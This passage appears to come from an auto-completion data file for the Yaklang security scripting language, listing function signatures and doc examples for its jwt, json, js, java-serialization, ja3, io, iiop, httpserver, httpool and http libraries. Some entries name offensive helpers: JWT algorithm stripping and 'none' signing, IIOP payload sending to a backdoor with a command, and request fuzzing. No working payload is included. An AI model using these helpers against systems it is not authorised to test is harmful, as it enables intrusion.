            definitionStr: "port(i int) func(config *ldapClientConfig)",
          },
          {
            functionName: "password(${1:i /*type: string*/})",
            document: "",
            definitionStr: "password(i string) func(config *ldapClientConfig)",
          },
          {
            functionName: "Login(${1:addr /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "Login(addr string, opts ...func(config *ldapClientConfig)) (*ldap.Conn, error)",
          },
        ],
      },
      {
        libName: "jwt",
        prefix: "jwt.",
        functions: [
          {
            functionName: "RemoveAlg(${1:token /*type: string*/})",
            document: "",
            definitionStr: "RemoveAlg(token string) (string, error)",
          },
          {
            functionName: "Parse(${1:tokenStr /*type: string*/}, ${2:keys...})",
            document: "",
            definitionStr:
              "Parse(tokenStr string, keys ...string) (*jwt.Token, []byte, error)",
          },
          {
            functionName:
              "JWTGenerateEx(${1:alg /*type: string*/}, ${2:extraHeader}, ${3:i}, ${4:key /*type: []byte*/})",
            document: "",
            definitionStr:
              "JWTGenerateEx(alg string, extraHeader any, i any, key []byte) (string, error)",
          },
          {
            functionName:
              "JWTGenerate(${1:alg /*type: string*/}, ${2:i}, ${3:key /*type: []byte*/})",
            document: "",
            definitionStr:
              "JWTGenerate(alg string, i any, key []byte) (string, error)",
          },
          {
            functionName:
              "JWSGenerateEx(${1:alg /*type: string*/}, ${2:extraHeader}, ${3:i}, ${4:key /*type: []byte*/})",
            document: "",
            definitionStr:
              "JWSGenerateEx(alg string, extraHeader any, i any, key []byte) (string, error)",
          },
          {
            functionName:
              "JWSGenerate(${1:alg /*type: string*/}, ${2:i}, ${3:key /*type: []byte*/})",
            document: "",
            definitionStr:
              "JWSGenerate(alg string, i any, key []byte) (string, error)",
          },
          {
            functionName: "AllAlgs()",
            document: "",
            definitionStr: "AllAlgs() []string",
          },
          {
            functionName: "ALG_RS512",
            document: "jwt.ALG_RS512: string",
            definitionStr: "jwt.ALG_RS512: string",
          },
          {
            functionName: "ALG_RS384",
            document: "jwt.ALG_RS384: string",
            definitionStr: "jwt.ALG_RS384: string",
          },
          {
            functionName: "ALG_RS256",
            document: "jwt.ALG_RS256: string",
            definitionStr: "jwt.ALG_RS256: string",
          },
          {
            functionName: "ALG_PS512",
            document: "jwt.ALG_PS512: string",
            definitionStr: "jwt.ALG_PS512: string",
          },
          {
            functionName: "ALG_PS384",
            document: "jwt.ALG_PS384: string",
            definitionStr: "jwt.ALG_PS384: string",
          },
          {
            functionName: "ALG_PS256",
            document: "jwt.ALG_PS256: string",
            definitionStr: "jwt.ALG_PS256: string",
          },
          {
            functionName: "ALG_NONE",
            document: "jwt.ALG_NONE: string",
            definitionStr: "jwt.ALG_NONE: string",
          },
          {
            functionName: "ALG_HS512",
            document: "jwt.ALG_HS512: string",
            definitionStr: "jwt.ALG_HS512: string",
          },
          {
            functionName: "ALG_HS384",
            document: "jwt.ALG_HS384: string",
            definitionStr: "jwt.ALG_HS384: string",
          },
          {
            functionName: "ALG_HS256",
            document: "jwt.ALG_HS256: string",
            definitionStr: "jwt.ALG_HS256: string",
          },
          {
            functionName: "ALG_ES512",
            document: "jwt.ALG_ES512: string",
            definitionStr: "jwt.ALG_ES512: string",
          },
          {
            functionName: "ALG_ES384",
            document: "jwt.ALG_ES384: string",
            definitionStr: "jwt.ALG_ES384: string",
          },
          {
            functionName: "ALG_ES256",
            document: "jwt.ALG_ES256: string",
            definitionStr: "jwt.ALG_ES256: string",
          },
        ],
      },
      {
        libName: "judge",
        prefix: "judge.",
        functions: [
          {
            functionName: "NewDiscriminator(${1:origin /*type: []byte*/})",
            document: "",
            definitionStr: "NewDiscriminator(origin []byte) *Discriminator",
          },
          {
            functionName:
              "CompareRaw(${1:rsp1 /*type: []byte*/}, ${2:rsp2 /*type: []byte*/})",
            document: "",
            definitionStr: "CompareRaw(rsp1 []byte, rsp2 []byte) float64",
          },
          {
            functionName:
              "CompareHTTPResponse(${1:rsp1 /*type: *http.Response*/}, ${2:rsp2 /*type: *http.Response*/})",
            document: "",
            definitionStr:
              "CompareHTTPResponse(rsp1 *http.Response, rsp2 *http.Response) float64",
          },
        ],
      },
      {
        libName: "json",
        prefix: "json.",
        functions: [
          {
            functionName: "withPrefix(${1:prefix /*type: string*/})",
            document: "",
            definitionStr:
              'withPrefix(prefix string) JsonOpt  doc:withPrefix 设置 JSON dumps时的前缀\n\nExample:\n```\nv = json.dumps({"a": "b", "c": "d"}, json.withPrefix("  "))\n```\n',
          },
          {
            functionName: "withIndent(${1:indent /*type: string*/})",
            document: "",
            definitionStr:
              'withIndent(indent string) JsonOpt  doc:withIndent 设置 JSON dumps时的缩进\n\nExample:\n```\nv = json.dumps({"a": "b", "c": "d"}, json.withIndent("  "))\n```\n',
          },
          {
            functionName: "loads(${1:raw}, ${2:opts...})",
            document: "",
            definitionStr:
              'loads(raw any, opts ...JsonOpt) any  doc:loads 将一个 JSON 字符串转换为对象，返回转换后的对象\n\nExample:\n```\nv = json.loads(`{"a": "b", "c": "d"}`)\n```\n',
          },
          {
            functionName: "dumps(${1:raw}, ${2:opts...})",
            document: "",
            definitionStr:
              'dumps(raw any, opts ...JsonOpt) string  doc:dumps 将一个对象转换为 JSON 字符串，返回转换后的字符串\n\n它还可以接收零个到多个请求选项函数，用于配置转换过程，控制转换后的缩进，前缀等\n\nExample:\n```\nv = json.dumps({"a": "b", "c": "d"})\n```\n',
          },
          {
            functionName:
              "ReplaceAll(${1:j}, ${2:jpath /*type: string*/}, ${3:replaceValue})",
            document: "",
            definitionStr:
              "ReplaceAll(j any, jpath string, replaceValue any) any",
          },
          {
            functionName: "New(${1:i})",
            document: "",
            definitionStr:
              'New(i any) (*yakJson, error)  doc:New 根据传入的值创建并返回一个新的 JSON 对象与错误\n\nExample:\n```\nv, err = json.New("foo")\nv, err = json.New(b"bar")\nv, err = json.New({"a": "b", "c": "d"})\n```\n',
          },
          {
            functionName: "Marshal(${1:v})",
            document: "",
            definitionStr:
              'Marshal(v any) ([]byte, error)  doc:Marshal 将一个对象转换为 JSON bytes，返回转换后的 bytes 与错误\n\nExample:\n```\nv, err = json.Marshal({"a": "b", "c": "d"})\n// v = b"{"a": "b", "c": "d"}"\n```\n',
          },
          {
            functionName: "FindPath(${1:j}, ${2:jpath /*type: string*/})",
            document: "",
            definitionStr: "FindPath(j any, jpath string) any",
          },
          {
            functionName: "Find(${1:j}, ${2:jpath /*type: string*/})",
            document: "",
            definitionStr: "Find(j any, jpath string) any",
          },
          {
            functionName: "ExtractJSONEx(${1:raw /*type: string*/})",
            document: "",
            definitionStr:
              "ExtractJSONEx(raw string) (results []string, rawStr []string)",
          },
          {
            functionName: "ExtractJSON(${1:raw /*type: string*/})",
            document: "",
            definitionStr: "ExtractJSON(raw string) []string",
          },
        ],
      },
      {
        libName: "js",
        prefix: "js.",
        functions: [
          {
            functionName: "withVariables(${1:vars /*type: map[string]any*/})",
            document: "",
            definitionStr: "withVariables(vars map[string]any) jsRunOpts",
          },
          {
            functionName: "withVariable(${1:name /*type: string*/}, ${2:value})",
            document: "",
            definitionStr: "withVariable(name string, value any) jsRunOpts",
          },
          {
            functionName: "libJsEncrypt()",
            document: "",
            definitionStr:
              'libJsEncrypt() jsRunOpts  doc:_libJsEncrypt 是一个JS运行选项参数，用于在运行JS代码时嵌入JsEncrypt 3.3.2库\n\nExample:\n```\n_, value = js.Run("var encrypt = new JSEncrypt();", js._libJsEncrypt())~\nprintln(value.String())\n```\n',
          },
          {
            functionName: "libJSRSASign()",
            document: "",
            definitionStr:
              'libJSRSASign() jsRunOpts  doc:libJSRSASign 是一个JS运行选项参数，用于在运行JS代码时嵌入jsrsasign 10.8.6库\n\nExample:\n```\n_, value = js.Run(`KEYUTIL.getKey(pemPublicKey).encrypt("yaklang")`, js.libJSRSASign())~\nprintln(value.String())\n```\n',
          },
          {
            functionName: "libCryptoJSV4()",
            document: "",
            definitionStr:
              'libCryptoJSV4() jsRunOpts  doc:libCryptoJSV4 是一个JS运行选项参数，用于在运行JS代码时嵌入CryptoJS 4.2.0库\n\nExample:\n```\n_, value = js.Run(`CryptoJS.HmacSHA256("Message", "secret").toString();`, js.libCryptoJSV4())~\nprintln(value.String())\n```\n',
          },
          {
            functionName: "libCryptoJSV3()",
            document: "",
            definitionStr:
              'libCryptoJSV3() jsRunOpts  doc:libCryptoJSV3 是一个JS运行选项参数，用于在运行JS代码时嵌入CryptoJS 3.3.0库\n\nExample:\n```\n_, value = js.Run(`CryptoJS.HmacSHA256("Message", "secret").toString();`, js.libCryptoJSV3())~\nprintln(value.String())\n```\n',
          },
          {
            functionName: "UndefinedValue",
            document: "js.UndefinedValue: goja.valueUndefined",
            definitionStr: "js.UndefinedValue: goja.valueUndefined",
          },
          {
            functionName: "ToValue(${1:v1/*type: any*/})",
            document: "",
            definitionStr: "func js.ToValue(v1: any) return (r0: goja.Value)",
          },
          {
            functionName: "Run(${1:src}, ${2:opts...})",
            document: "",
            definitionStr:
              'Run(src any, opts ...jsRunOpts) (*goja.Runtime, goja.Value, error)  doc:Run 创建新的JS引擎并运行传入的代码并返回JS引擎结构体引用，运行值和错误\n\n第一个参数为运行的代码字符串\n\n后续参数为零个到多个运行选项，用于对此次运行进行配置，例如嵌入常用的JS第三方库等\n\n现在会尝试自动导入代码中使用到的库, CryptoJS会导入V4版本\n\nExample:\n```\n_, value = js.Run(`CryptoJS.HmacSHA256("Message", "secret").toString();`, js.libCryptoJSV3())~\nprintln(value.String())\n```\n',
          },
          {
            functionName: "PoweredBy",
            document: "js.PoweredBy: string",
            definitionStr: "js.PoweredBy: string",
          },
          {
            functionName: "Parse(${1:code /*type: string*/})",
            document: "",
            definitionStr:
              "Parse(code string) (*ast.Program, error)  doc:Parse 对传入的JS代码进行解析并返回解析后的AST树和错误\n\nExample:\n```\ncode = `function add(a, b) { return a + b; }`\ntree = js.Parse(code)~\ndump(tree)\n```\n",
          },
          {
            functionName: "NullValue",
            document: "js.NullValue: goja.valueNull",
            definitionStr: "js.NullValue: goja.valueNull",
          },
          {
            functionName: "New(${1:opts...})",
            document: "",
            definitionStr:
              'New(opts ...jsRunOpts) *goja.Runtime  doc:New 创建新的JS引擎并返回\n\nExample:\n```\nengine = js.New()\nval = engine.RunString("1+1")~.ToInteger()~\nprintln(val)\n```\n',
          },
          {
            functionName: "NaNValue",
            document: "js.NaNValue: goja.valueFloat",
            definitionStr: "js.NaNValue: goja.valueFloat",
          },
          {
            functionName: "GetSTType(${1:st})",
            document: "",
            definitionStr: "GetSTType(st any) string",
          },
          {
            functionName:
              "CallFunctionFromCode(${1:src}, ${2:funcName /*type: string*/}, ${3:params...})",
            document: "",
            definitionStr:
              'CallFunctionFromCode(src any, funcName string, params ...any) (goja.Value, error)  doc:CallFunctionFromCode 从传入的代码中调用指定的JS函数并返回调用结果\n\n它的第一个参数为包含JS代码的字符串\n\n第二个参数为要调用的JS函数名\n\n后续参数为零个到多个函数参数\n\nExample:\n```\nvalue = js.CallFunctionFromCode(`function add(a, b) { return a + b; }`, "add", 1, 2)~\nprintln(value.String())\n```\n',
          },
          {
            functionName: "ASTWalk(${1:code /*type: string*/})",
            document: "",
            definitionStr:
              "ASTWalk(code string) (*ASTWalkerResult, error)  doc:ASTWalk 对传入的JS代码进行AST遍历，返回遍历后的结果(包含字面量，标识符，语法错误)和错误\n\nExample:\n```\ncode = `function add(a, b) { return a + b; }`\nres = javascript.ASTWalk(code)~\ndump(res)\n```\n",
          },
        ],
      },
      {
        libName: "java",
        prefix: "java.",
        functions: [
          {
            functionName: "ToJson(${1:i})",
            document: "",
            definitionStr: "ToJson(i any) ([]byte, error)",
          },
          {
            functionName: "ParseJavaObjectStream(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr:
              "ParseJavaObjectStream(raw []byte) ([]JavaSerializable any, error any)",
          },
          {
            functionName: "ParseHexJavaObjectStream(${1:raw /*type: string*/})",
            document: "",
            definitionStr:
              "ParseHexJavaObjectStream(raw string) ([]JavaSerializable any, error any)",
          },
          {
            functionName: "NewJavaString(${1:raw /*type: string*/})",
            document: "",
            definitionStr: "NewJavaString(raw string) *JavaString",
          },
          {
            functionName: "NewJavaReference(${1:handle /*type: uint64*/})",
            document: "",
            definitionStr: "NewJavaReference(handle uint64) *JavaReference",
          },
          {
            functionName:
              "NewJavaObject(${1:class /*type: *JavaClassDesc*/}, ${2:classData...})",
            document: "",
            definitionStr:
              "NewJavaObject(class *JavaClassDesc, classData ...*JavaClassData) *JavaObject",
          },
          {
            functionName: "NewJavaNull()",
            document: "",
            definitionStr: "NewJavaNull() *JavaNull",
          },
          {
            functionName: "NewJavaLongString(${1:raw /*type: string*/})",
            document: "",
            definitionStr: "NewJavaLongString(raw string) *JavaString",
          },
          {
            functionName:
              "NewJavaFieldValue(${1:t /*type: byte*/}, ${2:raw /*type: []byte*/})",
            document: "",
            definitionStr:
              "NewJavaFieldValue(t byte, raw []byte) *JavaFieldValue",
          },
          {
            functionName: "NewJavaFieldShortValue(${1:i /*type: int*/})",
            document: "",
            definitionStr: "NewJavaFieldShortValue(i int) *JavaFieldValue",
          },
          {
            functionName:
              "NewJavaFieldObjectValue(${1:i /*type: JavaSerializable*/})",
            document: "",
            definitionStr:
              "NewJavaFieldObjectValue(i JavaSerializable) *JavaFieldValue",
          },
          {
            functionName: "NewJavaFieldLongValue(${1:i /*type: uint64*/})",
            document: "",
            definitionStr: "NewJavaFieldLongValue(i uint64) *JavaFieldValue",
          },
          {
            functionName: "NewJavaFieldIntValue(${1:i /*type: uint64*/})",
            document: "",
            definitionStr: "NewJavaFieldIntValue(i uint64) *JavaFieldValue",
          },
          {
            functionName: "NewJavaFieldFloatValue(${1:i /*type: float32*/})",
            document: "",
            definitionStr: "NewJavaFieldFloatValue(i float32) *JavaFieldValue",
          },
          {
            functionName: "NewJavaFieldDoubleValue(${1:i /*type: float64*/})",
            document: "",
            definitionStr: "NewJavaFieldDoubleValue(i float64) *JavaFieldValue",
          },
          {
            functionName: "NewJavaFieldCharValue(${1:i /*type: int*/})",
            document: "",
            definitionStr: "NewJavaFieldCharValue(i int) *JavaFieldValue",
          },
          {
            functionName: "NewJavaFieldByteValue(${1:b /*type: byte*/})",
            document: "",
            definitionStr: "NewJavaFieldByteValue(b byte) *JavaFieldValue",
          },
          {
            functionName: "NewJavaFieldBoolValue(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "NewJavaFieldBoolValue(b bool) *JavaFieldValue",
          },
          {
            functionName:
              "NewJavaFieldArrayValue(${1:i /*type: JavaSerializable*/})",
            document: "",
            definitionStr:
              "NewJavaFieldArrayValue(i JavaSerializable) *JavaFieldValue",
          },
          {
            functionName:
              "NewJavaEnum(${1:i /*type: *JavaClassDesc*/}, ${2:constantName /*type: *JavaString*/})",
            document: "",
            definitionStr:
              "NewJavaEnum(i *JavaClassDesc, constantName *JavaString) *JavaEnumDesc",
          },
          {
            functionName: "NewJavaEndBlockData()",
            document: "",
            definitionStr: "NewJavaEndBlockData() *JavaEndBlockData",
          },
          {
            functionName: "NewJavaClassFields(${1:fields...})",
            document: "",
            definitionStr:
              "NewJavaClassFields(fields ...*JavaClassField) *JavaClassFields",
          },
          {
            functionName:
              "NewJavaClassField(${1:name /*type: string*/}, ${2:jType /*type: byte*/}, ${3:className /*type: JavaSerializable*/})",
            document: "",
            definitionStr:
              "NewJavaClassField(name string, jType byte, className JavaSerializable) *JavaClassField",
          },
          {
            functionName:
              "NewJavaClassDetails(${1:className /*type: string*/}, ${2:serialVersionUID /*type: []byte*/}, ${3:Flag /*type: byte*/}, ${4:Fields /*type: *JavaClassFields*/}, ${5:Annotations /*type: []JavaSerializable*/}, ${6:SuperClass /*type: *JavaClassDetails*/})",
            document: "",
            definitionStr:
              "NewJavaClassDetails(className string, serialVersionUID []byte, Flag byte, Fields *JavaClassFields, Annotations []JavaSerializable, SuperClass *JavaClassDetails) *JavaClassDetails",
          },
          {
            functionName:
              "NewJavaClassDesc(${1:className /*type: string*/}, ${2:serialVersionUID /*type: []byte*/}, ${3:flag /*type: byte*/}, ${4:fields /*type: *JavaClassFields*/}, ${5:annotations /*type: []JavaSerializable*/}, ${6:superClass /*type: *JavaClassDetails*/})",
            document: "",
            definitionStr:
              "NewJavaClassDesc(className string, serialVersionUID []byte, flag byte, fields *JavaClassFields, annotations []JavaSerializable, superClass *JavaClassDetails) *JavaClassDesc",
          },
          {
            functionName:
              "NewJavaClassData(${1:fields /*type: []JavaSerializable*/}, ${2:blockData /*type: []JavaSerializable*/})",
            document: "",
            definitionStr:
              "NewJavaClassData(fields []JavaSerializable, blockData []JavaSerializable) *JavaClassData",
          },
          {
            functionName: "NewJavaClass(${1:j /*type: *JavaClassDesc*/})",
            document: "",
            definitionStr: "NewJavaClass(j *JavaClassDesc) *JavaClass",
          },
          {
            functionName: "NewJavaBlockDataBytes(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr: "NewJavaBlockDataBytes(raw []byte) *JavaBlockData",
          },
          {
            functionName:
              "NewJavaArray(${1:j /*type: *JavaClassDesc*/}, ${2:values...})",
            document: "",
            definitionStr:
              "NewJavaArray(j *JavaClassDesc, values ...*JavaFieldValue) *JavaArray",
          },
          {
            functionName: "MarshalJavaObjects(${1:res...})",
            document: "",
            definitionStr: "MarshalJavaObjects(res ...JavaSerializable) []byte",
          },
          {
            functionName: "FromJson(${1:raw /*type: []byte*/})",
            document: "",
            definitionStr:
              "FromJson(raw []byte) ([]JavaSerializable any, error any)",
          },
        ],
      },
      {
        libName: "ja3",
        prefix: "ja3.",
        functions: [
          {
            functionName: "ParseJA3ToClientHelloSpec(${1:str /*type: string*/})",
            document: "",
            definitionStr:
              "ParseJA3ToClientHelloSpec(str string) (*tls.ClientHelloSpec, error)",
          },
          {
            functionName: "ParseJA3S(${1:ja3sFullString /*type: string*/})",
            document: "",
            definitionStr:
              "ParseJA3S(ja3sFullString string) (*JA3S any, error any)",
          },
          {
            functionName: "ParseJA3(${1:ja3FullString /*type: string*/})",
            document: "",
            definitionStr: "ParseJA3(ja3FullString string) (*JA3 any, error any)",
          },
          {
            functionName:
              "GetTransportByClientHelloSpec(${1:spec /*type: *tls.ClientHelloSpec*/})",
            document: "",
            definitionStr:
              "GetTransportByClientHelloSpec(spec *tls.ClientHelloSpec) *http.Transport",
          },
        ],
      },
      {
        libName: "io",
        prefix: "io.",
        functions: [
          {
            functionName:
              "WriteString(${1:writer /*type: io.Writer*/}, ${2:s /*type: string*/})",
            document: "",
            definitionStr:
              'WriteString(writer io.Writer, s string) (n int, err error)  doc:WriteString 将字符串 s 写入 writer 中，返回写入的字节数和错误\n\nExample:\n```\nn, err = io.WriteString(writer, "hello yak")\n```\n',
          },
          {
            functionName:
              "TeeReader(${1:r /*type: io.Reader*/}, ${2:w /*type: io.Writer*/})",
            document: "",
            definitionStr:
              "TeeReader(r io.Reader, w io.Writer) io.Reader  doc:TeeReader 返回一个 Reader，该 Reader 从 r 中读取字节，并将读取到的字节写入 w 中\n\n该 Reader 通常用于保存已经读取的数据副本\n\nExample:\n```\ntr = io.TeeReader(reader, buf)\nio.ReadAll(tr)\n// 现在 buf 中也保存了 reader 中的读到的所有数据\n```\n",
          },
          {
            functionName:
              "ReadStable(${1:reader /*type: io.Reader*/}, ${2:float /*type: float64*/})",
            document: "",
            definitionStr:
              "ReadStable(reader io.Reader, float float64) []byte  doc:ReadStable 从 reader 中稳定地读取数据，直到读取到 EOF 或者超时，返回读取到的数据\n\nExample:\n```\ndata = io.ReadStable(reader, 60)\n```\n",
          },
          {
            functionName: "ReadFile(${1:path /*type: string*/})",
            document: "",
            definitionStr:
              'ReadFile(path string) ([]byte, error)  doc:ReadFile 读取指定文件中的所有内容，返回读取到的数据和错误\n\nExample:\n```\n// 假设存在文件 /tmp/test.txt，内容为 "hello yak"\ndata, err = ioutil.ReadFile("/tmp/test.txt") // data = b"hello yak", err = nil\n```\n',
          },
          {
            functionName:
              "ReadEvery1s(${1:c /*type: context.Context*/}, ${2:reader /*type: io.Reader*/}, ${3:f /*type: func([]byte) bool*/})",
            document: "",
            definitionStr:
              'ReadEvery1s(c context.Context, reader io.Reader, f func([]byte) bool)  doc:ReadEvery1s 每秒读取 Reader 一次，直到读取到 EOF 或者回调函数返回 false\n\nExample:\n```\nr, w, err = io.Pipe() // 创建一个管道，返回一个读取端和一个写入端以及错误\ndie(err)\ngo func{\nfor {\nw.WriteString("hello yak\\n")\ntime.Sleep(1)\n}\n}\nio.ReadEvery1s(context.New(), r, func(data) {\nprintln(string(data))\nreturn true\n})\n```\n',
          },
          {
            functionName: "ReadAll(${1:r /*type: io.Reader*/})",
            document: "",
            definitionStr:
              "ReadAll(r io.Reader) ([]byte, error)  doc:ReadAll 读取 Reader 中的所有字节，返回读取到的数据和错误\n\nExample:\n```\ndata, err = ioutil.ReadAll(reader)\n```\n",
          },
          {
            functionName: "Pipe()",
            document: "",
            definitionStr:
              'Pipe() (r *os.File, w *os.File, err error)  doc:Pipe 创建一个管道，返回一个读取端和一个写入端以及错误\n\nExample:\n```\nr, w, err = os.Pipe()\ndie(err)\n\n\tgo func {\n\t    w.WriteString("hello yak")\n\t    w.Close()\n\t}\n\nbytes, err = io.ReadAll(r)\ndie(err)\ndump(bytes)\n```\n',
          },
          {
            functionName: "NopCloser(${1:r /*type: io.Reader*/})",
            document: "",
            definitionStr:
              "NopCloser(r io.Reader) io.ReadCloser  doc:NopCloser 返回一个 ReadCloser，该 ReadCloser 从 r 中读取数据，并实现了一个空的 Close 方法\n\nExample:\n```\nr = io.NopCloser(reader)\nr.Close() // 什么都不做\n```\n",
          },
          {
            functionName: "MultiReader(${1:readers...})",
            document: "",
            definitionStr:
              "MultiReader(readers ...io.Reader) io.Reader  doc:MultiReader 返回一个 Reader，该 Reader 从多个 Reader 中读取数据\n\nExample:\n```\nmr = io.MultiReader(reader1, reader2) // 读取 mr 即按照顺序读取 reader1 和 reader2 中的数据\nio.ReadAll(mr)\n```\n",
          },
          {
            functionName:
              "LimitReader(${1:r /*type: io.Reader*/}, ${2:n /*type: int64*/})",
            document: "",
            definitionStr:
              "LimitReader(r io.Reader, n int64) io.Reader  doc:LimitReader 返回一个 Reader，该 Reader 从 r 中读取字节，但在读取 n 个字节后就会返回 EOF\n\nExample:\n```\nlr = io.LimitReader(reader, 1024)\n```\n",
          },
          {
            functionName: "EOF",
            document: "io.EOF: *errors.errorString",
            definitionStr: "io.EOF: *errors.errorString",
          },
          {
            functionName: "Discard",
            document: "io.Discard: io.discard",
            definitionStr: "io.Discard: io.discard",
          },
          {
            functionName:
              "CopyN(${1:writer /*type: io.Writer*/}, ${2:reader /*type: io.Reader*/}, ${3:n /*type: int64*/})",
            document: "",
            definitionStr:
              "CopyN(writer io.Writer, reader io.Reader, n int64) (written int64, err error)  doc:CopyN 将 reader 中的数据拷贝到 writer 中，直到读取到 EOF 或者拷贝了 n 个字节，返回拷贝的字节数和错误\n\nExample:\n```\nn, err = io.CopyN(writer, reader, 1024)\n```\n",
          },
          {
            functionName:
              "Copy(${1:writer /*type: io.Writer*/}, ${2:reader /*type: io.Reader*/})",
            document: "",
            definitionStr:
              "Copy(writer io.Writer, reader io.Reader) (written int64, err error)  doc:Copy 将 reader 中的数据拷贝到 writer 中，直到读取到 EOF 或者发生错误，返回拷贝的字节数和错误\n\nExample:\n```\nn, err = io.Copy(writer, reader)\n```\n",
          },
        ],
      },
      {
        libName: "iiop",
        prefix: "iiop.",
        functions: [
          {
            functionName:
              "SendPayload(${1:addr /*type: string*/}, ${2:sendPayload /*type: PayloadGeneraterFun*/})",
            document: "",
            definitionStr:
              "SendPayload(addr string, sendPayload PayloadGeneraterFun) error",
          },
          {
            functionName: "RebindPayload(${1:rmi /*type: string*/})",
            document: "",
            definitionStr: "RebindPayload(rmi string) PayloadGeneraterFun",
          },
          {
            functionName:
              "InvokePayload(${1:backDoor /*type: string*/}, ${2:cmd /*type: string*/})",
            document: "",
            definitionStr:
              "InvokePayload(backDoor string, cmd string) PayloadGeneraterFun",
          },
          {
            functionName: "BindPayload(${1:rmi /*type: string*/})",
            document: "",
            definitionStr: "BindPayload(rmi string) PayloadGeneraterFun",
          },
        ],
      },
      {
        libName: "httpserver",
        prefix: "httpserver.",
        functions: [
          {
            functionName: "tlsCertAndKey(${1:crt}, ${2:key}, ${3:cas...})",
            document: "",
            definitionStr:
              'tlsCertAndKey(crt any, key any, cas ...any) HttpServerConfigOpt  doc:tlsCertAndKey 用于设置 HTTP服务器的 TLS 证书和密钥，第一个参数为证书，第二个参数为密钥，第三个参数为可选的 CA 证书\n\n一般配合tls标准库使用\n\nExample:\n```\nca, key, err = tls.GenerateRootCA("yaklang.io")\ncert, sKey, err = tls.SignServerCertAndKey(ca, key)\nerr = httpserver.Serve("127.0.0.1", 8888, httpserver.tlsCertAndKey(cert, sKey))\n```\n',
          },
          {
            functionName:
              "handler(${1:cb /*type: func(rsp http.ResponseWriter, req *http.Request)*/})",
            document: "",
            definitionStr:
              'handler(cb func(rsp http.ResponseWriter, req *http.Request)) HttpServerConfigOpt  doc:handler 用于设置 HTTP 服务器的回调函数，此函数会在每次收到请求时被调用\n\n此函数的第一个参数为响应回复者结构体，第二个参数为 请求结构体，你可以调用第一个参数中的方法来设置响应头，响应体等\n\nExample:\n```\nerr = httpserver.Serve("127.0.0.1", 8888, httpserver.handler(func(rspWriter, req) { rspWriter.Write("Hello world") }))\n```\n',
          },
          {
            functionName: "context(${1:ctx /*type: context.Context*/})",
            document: "",
            definitionStr:
              'context(ctx context.Context) HttpServerConfigOpt  doc:context 用于设置 HTTP 服务器的上下文\n\nExample:\n```\nctx = context.New()\nerr = httpserver.Serve("127.0.0.1", httpserver, http.context(ctx))\n```\n',
          },
          {
            functionName:
              "Serve(${1:host /*type: string*/}, ${2:port /*type: int*/}, ${3:opts...})",
            document: "",
            definitionStr:
              'Serve(host string, port int, opts ...HttpServerConfigOpt) error  doc:Serve 根据给定的 host 和 port 启动一个 http 服务，第一个参数为监听主机，第二个参数为监听端口，接下来可以接收零个到多个选项函数，用于设置上下文，回调函数等\n\nExample:\n```\nerr = httpserver.Serve("127.0.0.1", 8888, httpserver.handler(func(rspWriter, req) { rspWriter.Write("Hello world") }))\n```\n',
          },
          {
            functionName:
              "LocalFileSystemServe(${1:host /*type: string*/}, ${2:port /*type: int*/}, ${3:prefix /*type: string*/}, ${4:localPath /*type: string*/}, ${5:opts...})",
            document: "",
            definitionStr:
              'LocalFileSystemServe(host string, port int, prefix string, localPath string, opts ...HttpServerConfigOpt) error  doc:LocalFileSystemServe 根据给定的 host 和 port 启动一个 http 服务用于访问本地文件系统\n\n第一个参数为监听主机，第二个参数为监听端口，第三个参数为访问路径前缀，第四个参数为本地文件系统路径，接下来可以接收零个到多个选项函数，用于设置上下文，回调函数等\n\nExample:\n```\nerr = httpserver.LocalFileSystemServe("127.0.0.1", 8888, "/static", "/var/www/static")\n```\n',
          },
        ],
      },
      {
        libName: "httpool",
        prefix: "httpool.",
        functions: [
          {
            functionName: "size(${1:i /*type: int*/})",
            document: "",
            definitionStr: "size(i int) HttpPoolConfigOption",
          },
          {
            functionName: "redirectTimes(${1:f /*type: int*/})",
            document: "",
            definitionStr: "redirectTimes(f int) HttpPoolConfigOption",
          },
          {
            functionName: "rawMode(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "rawMode(b bool) HttpPoolConfigOption",
          },
          {
            functionName: "proxy(${1:proxies...})",
            document: "",
            definitionStr: "proxy(proxies ...string) HttpPoolConfigOption",
          },
          {
            functionName: "port(${1:port /*type: int*/})",
            document: "",
            definitionStr: "port(port int) HttpPoolConfigOption",
          },
          {
            functionName: "perRequestTimeout(${1:f /*type: float64*/})",
            document: "",
            definitionStr: "perRequestTimeout(f float64) HttpPoolConfigOption",
          },
          {
            functionName: "noRedirect(${1:i /*type: bool*/})",
            document: "",
            definitionStr: "noRedirect(i bool) HttpPoolConfigOption",
          },
          {
            functionName: "noFixContentLength(${1:f /*type: bool*/})",
            document: "",
            definitionStr: "noFixContentLength(f bool) HttpPoolConfigOption",
          },
          {
            functionName: "https(${1:f /*type: bool*/})",
            document: "",
            definitionStr: "https(f bool) HttpPoolConfigOption",
          },
          {
            functionName:
              "host(${1:h /*type: string*/}, ${2:isHttps /*type: bool*/})",
            document: "",
            definitionStr: "host(h string, isHttps bool) HttpPoolConfigOption",
          },
          {
            functionName: "fuzzParams(${1:i})",
            document: "",
            definitionStr: "fuzzParams(i any) HttpPoolConfigOption",
          },
          {
            functionName: "fuzz(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "fuzz(b bool) HttpPoolConfigOption",
          },
          {
            functionName: "context(${1:ctx /*type: context.Context*/})",
            document: "",
            definitionStr: "context(ctx context.Context) HttpPoolConfigOption",
          },
          {
            functionName: "connPool(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "connPool(b bool) HttpPoolConfigOption",
          },
          {
            functionName: "Pool(${1:i}, ${2:opts...})",
            document: "",
            definitionStr:
              "Pool(i any, opts ...HttpPoolConfigOption) (chan *HttpResult, error)",
          },
        ],
      },
      {
        libName: "http",
        prefix: "http.",
        functions: [
          {
            functionName: "useragent(${1:value})",
            document: "",
            definitionStr:
              'useragent(value any) http_struct.HttpOption  doc:useragent 是一个请求选项参数，用于指定请求的 User-Agent\n\nExample:\n```\nrsp, err = http.Get("http://www.yaklang.com", http.ua("yaklang-http"))\n```\n',
          },
          {
            functionName: "uarand()",
            document: "",
            definitionStr:
              "uarand() string  doc:uarand 返回一个随机的 User-Agent\n\nExample:\n```\nua = http.uarand()\n```\n",
          },
          {
            functionName: "ua(${1:value})",
            document: "",
            definitionStr:
